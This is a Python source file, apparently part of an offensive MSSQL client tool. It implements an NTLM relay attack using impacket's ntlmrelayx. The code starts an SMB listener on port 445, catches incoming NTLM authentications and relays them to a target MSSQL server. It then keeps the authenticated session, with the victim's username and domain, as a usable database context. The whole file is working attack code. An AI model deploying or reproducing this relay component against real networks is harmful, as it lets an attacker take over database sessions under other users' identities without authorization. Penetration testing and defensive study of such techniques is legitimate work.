# Built-in imports
import sys
import time
from typing import Optional

# Third party imports
from loguru import logger

from impacket.examples.ntlmrelayx.clients.mssqlrelayclient import MSSQLRelayClient
from impacket.examples.ntlmrelayx.attacks import PROTOCOL_ATTACKS, ProtocolAttack
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor
from impacket.examples.ntlmrelayx.servers import SMBRelayServer
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig

# Local library imports
from mssqlclientng.src.services.database import DatabaseContext
from mssqlclientng.src.models.server import Server


class RelayMSSQL:
    """
    NTLM Relay server for MSSQL authentication capture.
    Manages relay servers and captured authenticated clients.
    """

    def __init__(self, hostname: str):
        self.relay_servers = []
        self.threads = set()
        self.captured_client = None  # Store single captured client
        self.server_instance = None  # Will be set when waiting for connection

        # Only register MSSQL protocol client (avoid loading all protocols)
        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        logger.info("Starting NTLM Relay listener")
        self.targets_processor = TargetsProcessor(
            singleTarget=f"mssql://{hostname}",
            protocolClients=minimal_protocol_clients,
        )
        self.relay_servers.append(SMBRelayServer)

        # Create custom attack class that references this instance
        self._register_attack()

    def _register_attack(self):
        """Register custom attack class that captures to this instance."""
        relay_instance = self

        class CustomMSSQLAttack(ProtocolAttack):
            """Custom MSSQL attack bound to RelayMSSQL instance."""

            PLUGIN_NAMES = ["MSSQL"]

            def run(self):
                """Capture authenticated client after successful relay."""
                logger.success(
                    f"Successfully relayed authentication for {self.domain}\\{self.username}"
                )
                logger.info(
                    f"Target: {self.target.hostname if self.target else 'Unknown'}"
                )

                # Store in parent RelayMSSQL instance
                relay_instance.captured_client = {
                    "client": self.client,
                    "username": self.username,
                    "domain": self.domain,
                }
                return True

        PROTOCOL_ATTACKS["MSSQL"] = CustomMSSQLAttack
        logger.debug("Registered CustomMSSQLAttack for MSSQL protocol")

    def start(self, smb2support: bool = False, ntlmchallenge: str = None):
        # Only use MSSQL protocol client
        minimal_protocol_clients = {"MSSQL": MSSQLRelayClient}

        for server in self.relay_servers:
            # Set up config
            c = NTLMRelayxConfig()

            c.setProtocolClients(minimal_protocol_clients)
            c.setTargets(self.targets_processor)
            c.setExeFile(None)
            c.setCommand(None)
            c.setEnumLocalAdmins(None)
            c.setAddComputerSMB(None)
            c.setDisableMulti(None)
            c.setKeepRelaying(False)
            c.setEncoding(sys.getdefaultencoding())
            c.setMode("RELAY")
            c.setAttacks(PROTOCOL_ATTACKS)
            c.setLootdir(".")
            c.setOutputFile(None)
            c.setdumpHashes(False)
            c.setSMB2Support(smb2support)
            c.setSMBChallenge(ntlmchallenge)
            c.setInterfaceIp("0.0.0.0")

            if server is SMBRelayServer:
                c.setListeningPort(445)

            s = server(c)
            s.start()
            self.threads.add(s)
        return c

    def wait_for_connection(
        self, server_instance: Server, timeout: int = 60
    ) -> Optional[DatabaseContext]:
        """
        Wait for a relayed connection and create a DatabaseContext from it.

        Args:
            server_instance: Server model with hostname, port, database already configured
            timeout: Maximum seconds to wait for a connection

        Returns:
            DatabaseContext instance or None if no connection captured
        """
        self.server_instance = server_instance
        logger.info(f"Waiting up to {timeout} seconds for relayed connection")

        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.captured_client:
                logger.success("Relayed connection captured!")

                # Extract authenticated client and user info
                mssql_client = self.captured_client["client"]
                username = self.captured_client["username"]
                domain = self.captured_client["domain"]

                # Create DatabaseContext using the authenticated client
                logger.trace(
                    f"Creating DatabaseContext for {domain}\\{username}@{server_instance.hostname}"
                )
                db_context = DatabaseContext(
                    server=server_instance, mssql_instance=mssql_client
                )

                # Update server with relayed user info
                db_context.server.mapped_user = (
                    f"{domain}\\{username}" if domain else username
                )
                logger.trace("DatabaseContext created successfully")

                return db_context

            time.sleep(0.5)

        logger.warning(f"No relayed connection received within {timeout} seconds")
        return None

    def stop_servers(self):
        """Stop all relay servers."""
        todelete = []
        for thread in self.threads:
            if isinstance(thread, tuple(self.relay_servers)):
                thread.server.shutdown()
                todelete.append(thread)
        for thread in todelete:
            self.threads.remove(thread)
            del thread

    def __del__(self) -> None:
        """Destructor - ensure relay servers are stopped."""
        if self.threads:
            self.stop_servers()
